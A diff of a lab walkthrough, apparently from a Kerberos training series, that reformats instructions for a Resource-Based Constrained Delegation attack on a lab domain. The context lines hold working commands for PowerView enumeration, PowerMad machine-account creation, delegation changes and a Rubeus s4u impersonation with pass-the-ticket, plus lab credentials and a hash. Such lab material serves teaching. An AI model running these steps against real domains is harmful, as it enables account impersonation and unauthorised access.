@@ -17,6 +17,7 @@ IML - Kerberos: Ep.11 – Resource-Based Constrained Delegation (RBCD)
 ![image1](../resources/acf4b1efdfed40ba82617d29aaac9a3c.png)
 
 - RDP:
+
 ```bash
 xfreerdp /v:10.102.81.46 /u:s.villanelle /p:Summ3r2021! /d:krbtown +clipboard +drives /drive:root,/home/kali /dynamic-resolution
 
@@ -29,7 +30,7 @@ xfreerdp /v:10.102.81.46 /u:s.villanelle /p:Summ3r2021! /d:krbtown +clipboard +d
 
 - Enumeration:
 
-```bash
+```powershell
 . .\PowerView.ps1
 
 get-domainuser s.villanelle -properties objectsid | select -exp objectsid
@@ -59,6 +60,7 @@ get-domainobjectacl workstation-02 | ?{$_.SecurityIdentifier -eq "S-1-5-21-29846
 ![image8](../resources/2e5c18f4823445d0bcc084376334c4de.png)
 
 - Open Elevated Powershell:
+
 ```bash
 . .\Powerview.ps1
 
@@ -81,6 +83,7 @@ Get-DomainObject -Identity "dc=krbtown,dc=local" -Domain krbtown.local
 ![image13](../resources/d847b9c6c0104d779bdacc1f4aed11cb.png)
 
 - Open Elevated Powershell
+
 ```bash
 . .\Powerview.ps1
 
@@ -94,6 +97,7 @@ Get-NetComputer Workstation-02 | Select-Object -Property name, msDS-AllowedToAct
 ![image15](../resources/c85c465d4bb84a69a6930dfb6fb76267.png)
 
 - Open Elevated Powershell:
+
 ```bash
 . ./PowerMad.ps1
 
@@ -121,7 +125,8 @@ Set-ADComputer workstation-02 -PrincipalsAllowedToDelegateToAccount terminator$
 
 ![image18](../resources/bec307712f264d0dbebbb9bd49581ebe.png)
 
-- Open Elevated Powershell
+- Open Elevated Powershell:
+
 ```bash
 . .\Powerview.ps1
 
@@ -138,6 +143,7 @@ Get-ADComputer workstation-02 -Properties PrincipalsAllowedToDelegateToAccount
 ![image21](../resources/dd5d27563c1c482da276e7111c53c94f.png)
 
 - Open Elevated Powershell:
+
 .\Rubeus.exe hash /password:\<PASSWORD_OF_NEW_MACHINE\> /user:\<NEW_MACHINE_USERNAME\>\$ /domain:krbtown.local
 
 ```bash
@@ -153,7 +159,7 @@ Get-ADComputer workstation-02 -Properties PrincipalsAllowedToDelegateToAccount
 rubeus s4u /user:\<NEW_MACHINE_USERNAME\>\$ /rc4:\<NEW_MACHINE_HASH\> /impersonateuser:a.belridge /domain:krbtown.local /msdsspn:cifs/workstation-02.krbtown.local /ptt
 
 ```bash
-.\Rubeus.exe s4u /user:terminator\$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:a.belridge /domain:krbtown.local /msdsspn:cifs/workstation-02.krbtown.local /ptt
+.\Rubeus.exe s4u /user:terminator$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:a.belridge /domain:krbtown.local /msdsspn:cifs/workstation-02.krbtown.local /ptt
 
 ```
 
